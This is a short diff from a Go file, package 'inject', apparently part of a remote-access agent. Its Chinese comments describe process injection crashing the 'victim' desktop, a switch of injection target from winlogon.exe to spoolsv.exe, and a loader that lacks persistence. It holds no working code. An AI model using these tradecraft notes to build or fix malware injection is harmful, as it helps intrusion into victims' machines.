@@ -2,7 +2,7 @@
 // +build windows
 //进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
 //注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
-
+//存在问题，loader貌似没有实现持久化
 
 package inject
 
